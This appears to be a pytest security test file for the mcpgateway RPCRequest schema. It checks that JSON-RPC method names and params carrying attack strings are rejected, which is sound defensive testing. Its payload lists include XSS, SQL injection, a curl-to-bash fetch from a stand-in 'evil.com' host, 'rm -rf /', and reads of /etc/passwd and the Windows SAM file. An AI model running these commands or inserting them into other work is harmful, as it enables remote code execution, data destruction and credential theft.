# -*- coding: utf-8 -*-
"""Comprehensive RPC input validation security tests.

Copyright 2025
SPDX-License-Identifier: Apache-2.0
Authors: Mihai Criveti

This test module specifically targets the vulnerability where RPC method names
are not properly validated before processing, allowing malicious content to
reach internal tool lookup logic.

Run all tests:
    pytest test_rpc_input_validation.py -v -s

Run specific test:
    pytest test_rpc_input_validation.py::TestRPCSecurityValidation::test_rpc_xss_injection -v -s
"""

# Standard
import logging
from unittest.mock import patch

# Third-Party
from pydantic import ValidationError
import pytest

# First-Party
from mcpgateway.schemas import RPCRequest

# Configure logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


class TestRPCSecurityValidation:
    """Comprehensive security validation tests for RPC endpoints.

    This test class specifically targets the vulnerability where RPC method names
    are not properly validated before processing, allowing malicious content to
    reach internal tool lookup logic.

    Background:
    -----------
    The RPC endpoint accepts JSON-RPC 2.0 requests with a 'method' field that should
    conform to specific patterns:
    - System methods: 'tools_list', 'resources_list', 'servers_list'
    - Gateway methods: '[gateway-name]_[tool-name]' (e.g., 'time_server_get_time')
    - Path-based methods: 'servers/[uuid]/tools/list'

    The Issue:
    ----------
    Currently, invalid method names (including XSS payloads) are processed by the
    tool lookup logic instead of being rejected at the validation layer. This results
    in error messages like "Tool not found: <script>alert(1)</script>" which indicates
    the malicious input reached internal processing.

    Expected Behavior:
    -----------------
    - Invalid method names should be rejected with HTTP 422 or appropriate JSON-RPC error
    - Validation should occur BEFORE any database lookups or business logic
    - Error messages should not reflect raw user input
    - Method names should only contain alphanumeric characters, underscores, hyphens, and forward slashes

    Test Coverage:
    -------------
    1. Valid method name formats that should be accepted
    2. XSS attack vectors in method names
    3. SQL injection patterns
    4. Command injection attempts
    5. Path traversal attacks
    6. CRLF injection
    7. Unicode/encoding attacks
    8. Combined attack vectors
    9. Error message safety (no input reflection)
    10. Integration testing to ensure validation happens before processing
    """

    # Attack vectors
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<a href=\"javascript:alert('XSS')\">Click</a>",
    ]

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords --",
        "1' AND SLEEP(5)--",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`rm -rf /`",
        "$(curl evil.com/shell.sh | bash)",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
    ]

    CRLF_INJECTION_PAYLOADS = [
        "value\r\nSet-Cookie: admin=true",
        "value\nLocation: http://evil.com",
        "value\r\n\r\n<script>alert('XSS')</script>",
    ]

    UNICODE_PAYLOADS = [
        "＜script＞alert('XSS')＜/script＞",  # Full-width characters
        "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode escapes
        "\ufeff<script>alert('XSS')</script>",  # Zero-width characters
    ]

    def test_valid_rpc_methods(self):
        """Test that valid RPC method names are accepted."""
        logger.debug("Testing valid RPC method names")

        valid_methods = [
            # System methods
            "tools_list",
            "resources_list",
            "servers_list",
            "prompts_list",
            # Gateway-prefixed tool methods
            "gateway_tool_name",
            "time_server_get_time",
            "weather_api_get_forecast",
            # Prompt and resource methods
            "prompt_invoke",
            "resource_read",
            "resource_subscribe",
            # Methods with underscores and alphanumeric
            "valid_method_123",
            "METHOD_UPPERCASE",
            "mixedCase_Method",
        ]

        results = []
        for method in valid_methods:
            logger.debug(f"Testing valid RPC method: {method}")
            try:
                rpc = RPCRequest(jsonrpc="2.0", method=method, params={}, id=1)
                assert rpc.method == method
                results.append(f"✅ Valid method accepted: {method}")
            except ValidationError as e:
                results.append(f"❌ Valid method rejected but should have passed: {method} -> {str(e)}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_xss_injection(self):
        """Test that XSS payloads in method names are rejected."""
        logger.debug("Testing XSS payloads in RPC method names")

        results = []
        for i, payload in enumerate(self.XSS_PAYLOADS):
            logger.debug(f"Testing XSS payload #{i+1}: {payload[:50]}...")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ XSS #{i+1} was NOT rejected (security issue!): {payload[:30]}...")
            except ValidationError as e:
                results.append(f"✅ XSS #{i+1} correctly rejected: {payload[:30]}... -> {str(e).split(chr(10))[0]}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_sql_injection(self):
        """Test that SQL injection payloads in method names are rejected."""
        logger.debug("Testing SQL injection in RPC method names")

        results = []
        for i, payload in enumerate(self.SQL_INJECTION_PAYLOADS):
            logger.debug(f"Testing SQL injection #{i+1}: {payload}")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ SQL injection #{i+1} was NOT rejected (security issue!): {payload}")
            except ValidationError as e:
                results.append(f"✅ SQL injection #{i+1} correctly rejected: {payload} -> {str(e).split(chr(10))[0]}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_command_injection(self):
        """Test that command injection payloads in method names are rejected."""
        logger.debug("Testing command injection in RPC method names")

        results = []
        for i, payload in enumerate(self.COMMAND_INJECTION_PAYLOADS):
            logger.debug(f"Testing command injection #{i+1}: {payload}")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ Command injection #{i+1} was NOT rejected (security issue!): {payload}")
            except ValidationError as e:
                results.append(f"✅ Command injection #{i+1} correctly rejected: {payload} -> {str(e).split(chr(10))[0]}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_path_traversal(self):
        """Test that path traversal attempts in method names are rejected."""
        logger.debug("Testing path traversal in RPC method names")

        results = []
        for i, payload in enumerate(self.PATH_TRAVERSAL_PAYLOADS):
            logger.debug(f"Testing path traversal #{i+1}: {payload}")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ Path traversal #{i+1} was NOT rejected (security issue!): {payload[:30]}...")
            except ValidationError as e:
                results.append(f"✅ Path traversal #{i+1} correctly rejected: {payload[:30]}... -> {str(e).split(chr(10))[0]}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_invalid_formats(self):
        """Test various invalid method name formats."""
        logger.debug("Testing invalid RPC method name formats")

        invalid_methods = [
            # Whitespace issues
            ("method with spaces", "spaces"),
            (" leading_space", "leading space"),
            ("trailing_space ", "trailing space"),
            ("  ", "only spaces"),
            ("\t", "tab"),
            ("\n", "newline"),
            ("\r\n", "CRLF"),
            ("method\nname", "embedded newline"),
            # Invalid characters
            ("method@special", "@ symbol"),
            ("method#hash", "# symbol"),
            ("method$dollar", "$ symbol"),
            ("method%percent", "% symbol"),
            ("method&ampersand", "& symbol"),
            ("method*asterisk", "* symbol"),
            ("method(parens)", "parentheses"),
            ("method{braces}", "braces"),
            ("method[brackets]", "brackets"),
            ("method|pipe", "pipe"),
            ("method\\backslash", "backslash"),
            ("method<angle>", "< symbol"),
            ("method>bracket", "> symbol"),
            ("method?question", "? symbol"),
            ("method!exclaim", "! symbol"),
            ("method:colon", ": symbol"),
            ("method;semicolon", "; symbol"),
            ('method"quote', "quote"),
            ("method'apostrophe", "apostrophe"),
            ("method,comma", "comma"),
            ("method=equals", "= symbol"),
            ("method+plus", "+ symbol"),
            # Invalid starting characters
            ("9method", "starts with number"),
            (".method", "starts with dot"),
            ("-method", "starts with hyphen"),
            ("/method", "starts with slash"),
            ("_method", "starts with underscore"),
            # Invalid ending characters
            ("method.", "ends with dot"),
            ("method-", "ends with hyphen"),
            ("method/", "ends with slash"),
            # Length issues
            ("", "empty"),
            ("a" * 129, "too long"),
            # Double special characters
            ("method//double", "double slashes"),
            ("method__double", "double underscores"),
            ("method--double", "double hyphens"),
            # Null bytes
            ("method\x00null", "null byte"),
            ("method%00null", "encoded null"),
            ("\x00method", "leading null"),
            ("method\x00", "trailing null"),
        ]

        results = []
        for method, description in invalid_methods:
            logger.debug(f"Testing invalid format ({description}): {repr(method)}")
            try:
                RPCRequest(jsonrpc="2.0", method=method, id=1)
                results.append(f"❌ Invalid format ({description}) was NOT rejected: {repr(method[:20])}")
            except ValidationError:
                results.append(f"✅ Invalid format ({description}) correctly rejected: {repr(method[:20])}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_unicode_attacks(self):
        """Test Unicode-based attack vectors in method names."""
        logger.debug("Testing Unicode attacks in RPC method names")

        results = []
        for i, payload in enumerate(self.UNICODE_PAYLOADS):
            logger.debug(f"Testing Unicode attack #{i+1}: {repr(payload[:30])}...")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ Unicode attack #{i+1} was NOT rejected (security issue!)")
            except ValidationError:
                results.append(f"✅ Unicode attack #{i+1} correctly rejected")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_crlf_injection(self):
        """Test CRLF injection attempts in method names."""
        logger.debug("Testing CRLF injection in RPC method names")

        results = []
        for i, payload in enumerate(self.CRLF_INJECTION_PAYLOADS):
            logger.debug(f"Testing CRLF injection #{i+1}: {repr(payload[:30])}...")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ CRLF injection #{i+1} was NOT rejected (security issue!)")
            except ValidationError:
                results.append(f"✅ CRLF injection #{i+1} correctly rejected")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_combined_attacks(self):
        """Test combined attack vectors in method names."""
        logger.debug("Testing combined attack vectors in RPC method names")

        combined_attacks = [
            ("tools_list<script>alert(1)</script>", "valid prefix + XSS"),
            ("tools_list'; DROP TABLE users; --", "valid prefix + SQL"),
            ("tools_list../../etc/passwd", "valid prefix + path traversal"),
            ("tools_list\x00.php", "valid prefix + null byte"),
            ("tools_list\r\nX-Injection: true", "valid prefix + CRLF"),
            ("<script>alert(1)</script>_tools_list", "XSS + valid suffix"),
            ("'; DROP TABLE users; --tools_list", "SQL + valid suffix"),
            ("../../../tools_list", "path traversal + valid suffix"),
            ("tools_<script>_list", "valid parts + XSS middle"),
            ("gateway_'; DROP_tool", "valid parts + SQL middle"),
            ("tools_list{{7*7}}", "valid + template injection"),
            ("${tools_list}", "template variable"),
            ("{{tools_list}}", "double braces template"),
            ("#{tools_list}", "hash template"),
            ("%{tools_list}", "percent template"),
            ("';alert(1);//tools_list", "polyglot prefix"),
            ("tools_list');alert(1);//", "polyglot suffix"),
            ("<tools_list>", "HTML tag wrapper"),
            ("</tools_list>", "closing HTML tag"),
            ("<tools>list</tools>", "HTML wrapped"),
        ]

        results = []
        for attack, description in combined_attacks:
            logger.debug(f"Testing combined attack ({description}): {repr(attack)}")
            try:
                RPCRequest(jsonrpc="2.0", method=attack, id=1)
                results.append(f"❌ Combined attack ({description}) was NOT rejected: {attack[:30]}...")
            except ValidationError:
                results.append(f"✅ Combined attack ({description}) correctly rejected: {attack[:30]}...")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_prototype_pollution(self):
        """Test prototype pollution attempts in method names."""
        logger.debug("Testing prototype pollution in RPC method names")

        pollution_attempts = [
            ("__proto__", "proto"),
            ("constructor", "constructor"),
            ("prototype", "prototype"),
            ("toString", "toString"),
            ("valueOf", "valueOf"),
            ("hasOwnProperty", "hasOwnProperty"),
            ("__proto__.isAdmin", "proto chain"),
            ("constructor.prototype", "constructor chain"),
        ]

        results = []
        for attempt, description in pollution_attempts:
            logger.debug(f"Testing prototype pollution ({description}): {attempt}")
            try:
                rpc = RPCRequest(jsonrpc="2.0", method=attempt, id=1)
                results.append(f"⚠️  Prototype pollution ({description}) allowed: {attempt}")
            except ValidationError:
                results.append(f"✅ Prototype pollution ({description}) correctly rejected: {attempt}")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_error_message_safety(self):
        """Test that validation errors don't reflect user input."""
        logger.debug("Testing RPC error message safety")

        dangerous_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "admin' OR '1'='1",
            "<img src=x onerror=alert('XSS')>",
        ]

        results = []
        for payload in dangerous_payloads:
            logger.debug(f"Testing error message safety with: {payload[:30]}...")
            try:
                RPCRequest(jsonrpc="2.0", method=payload, id=1)
                results.append(f"❌ CRITICAL: Dangerous payload was not rejected: {payload}")
            except ValidationError as e:
                error_str = str(e)
                # Check if payload appears in error
                issues = []

                if payload in error_str:
                    issues.append("raw payload in error")
                if payload.replace("'", "\\'") in error_str:
                    issues.append("escaped payload in error")
                if payload.replace("'", "&apos;") in error_str:
                    issues.append("HTML-encoded payload in error")

                # Check for dangerous keywords
                dangerous_keywords = ["<script>", "DROP TABLE", "onerror", "../", "alert("]
                for keyword in dangerous_keywords:
                    if keyword in error_str and keyword in payload:
                        issues.append(f"dangerous keyword '{keyword}' in error")

                if issues:
                    results.append(f"❌ Error message safety FAILED for {payload[:20]}...: {', '.join(issues)}")
                    results.append(f"   Error was: {error_str[:100]}...")
                else:
                    results.append(f"✅ Error message properly sanitized for payload: {payload[:20]}...")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_params_validation(self):
        """Test that RPC params are also validated for security."""
        logger.debug("Testing RPC params validation")

        results = []

        # Test size limits
        with patch("mcpgateway.config.settings.validation_max_rpc_param_size", 1000):
            # Large payload
            large_params = {"data": "x" * 2000}
            try:
                RPCRequest(jsonrpc="2.0", method="valid_method", params=large_params)
                results.append("❌ Large params were NOT rejected")
            except ValidationError:
                results.append("✅ Large params correctly rejected")

            # Deeply nested payload
            deep_params = {"level1": {}}
            current = deep_params["level1"]
            for i in range(20):
                current[f"level{i+2}"] = {}
                current = current[f"level{i+2}"]

            try:
                RPCRequest(jsonrpc="2.0", method="valid_method", params=deep_params)
                results.append("❌ Deeply nested params were NOT rejected")
            except ValidationError:
                results.append("✅ Deeply nested params correctly rejected")

        # Test dangerous content in params
        dangerous_params = [
            ({"xss": "<script>alert('XSS')</script>"}, "XSS in params"),
            ({"sql": "'; DROP TABLE users; --"}, "SQL in params"),
            ({"cmd": "; rm -rf /"}, "command in params"),
            ({"path": "../../etc/passwd"}, "path traversal in params"),
        ]

        for params, description in dangerous_params:
            logger.debug(f"Testing dangerous params ({description}): {params}")
            try:
                rpc = RPCRequest(jsonrpc="2.0", method="valid_method", params=params)
                results.append(f"⚠️  Dangerous params ({description}) allowed - may need content-aware validation")
            except ValidationError:
                results.append(f"✅ Dangerous params ({description}) rejected")

        # Print all results
        for result in results:
            print(result)

    def test_rpc_edge_cases(self):
        """Test edge cases and boundary conditions for RPC methods."""
        logger.debug("Testing RPC edge cases")

        edge_cases = [
            # Case sensitivity
            ("TOOLS_LIST", "uppercase", "maybe"),
            ("Tools_List", "mixed case", "maybe"),
            ("tools_LIST", "partial mixed", "maybe"),
            # Almost valid formats
            ("tools-list", "hyphen instead of underscore", "no"),
            ("tools.list", "dot instead of underscore", "no"),
            ("tools/list", "forward slash", "maybe"),
            ("tools\\list", "backslash", "no"),
            # Repeated characters
            ("tools__list", "double underscore", "maybe"),
            ("tools___list", "triple underscore", "maybe"),
            ("tools____list", "many underscores", "maybe"),
            # Numeric variations
            ("tools_list_v2", "version suffix", "yes"),
            ("2_tools_list", "leading number", "no"),
            ("tools_2_list", "number in middle", "yes"),
            # Length boundaries
            ("a", "single char", "yes"),
            ("ab", "two chars", "yes"),
            ("a" * 127, "127 chars", "yes"),
            ("a" * 128, "128 chars", "yes"),
            ("a" * 129, "129 chars", "no"),
            # Special but potentially valid patterns
            ("get_", "trailing underscore", "maybe"),
            ("_get", "leading underscore", "maybe"),
            ("get__method", "double underscore", "maybe"),
            ("a-b-c", "multiple hyphens", "no"),
            # Internationalization
            ("tools_list_中文", "Chinese suffix", "no"),
            ("مرحبا_tools", "Arabic prefix", "no"),
            ("tools_list_café", "accented chars", "no"),
        ]

        results = []
        for method, description, expected in edge_cases:
            logger.debug(f"Testing edge case ({description}): {repr(method)}")
            try:
                rpc = RPCRequest(jsonrpc="2.0", method=method, id=1)
                if expected == "no":
                    results.append(f"❌ Edge case ({description}) was accepted but should be rejected: {method}")
                else:
                    results.append(f"✅ Edge case ({description}) allowed: {method}")
            except ValidationError:
                if expected == "yes":
                    results.append(f"❌ Edge case ({description}) was rejected but should be accepted: {method}")
                else:
                    results.append(f"✅ Edge case ({description}) correctly rejected: {method}")

        # Print all results
        for result in results:
            print(result)

    def test_summary(self):
        """Print a summary of what should be happening vs what is happening."""
        print("\n" + "=" * 80)
        print("RPC METHOD VALIDATION SUMMARY")
        print("=" * 80)
        print("\nCURRENT ISSUE:")
        print("- Malicious method names (XSS, SQLi, etc.) are reaching the tool lookup logic")
        print("- Error messages like 'Tool not found: <script>alert(1)</script>' indicate")
        print("  that validation is NOT happening before processing")
        print("\nEXPECTED BEHAVIOR:")
        print("- Method names should be validated BEFORE any processing")
        print("- Invalid formats should return HTTP 422 or JSON-RPC error -32602")
        print("- Error messages should NOT contain the raw user input")
        print("- Valid format: alphanumeric, underscores, possibly hyphens/slashes")
        print("\nVALID PATTERNS:")
        print("- System methods: tools_list, resources_list, servers_list")
        print("- Gateway methods: [gateway]_[tool] (e.g., time_server_get_time)")
        print("- Resource/prompt methods: resource_read, prompt_invoke")
        print("\nSHOULD BE REJECTED:")
        print("- Any HTML tags or JavaScript")
        print("- SQL injection patterns")
        print("- Command injection characters (; | & ` $)")
        print("- Path traversal sequences (../ ..\\)")
        print("- CRLF injection (\\r\\n)")
        print("- Null bytes (\\x00)")
        print("- Non-ASCII characters")
        print("=" * 80 + "\n")


if __name__ == "__main__":
    # Run the tests directly
    pytest.main([__file__, "-v", "-s"])
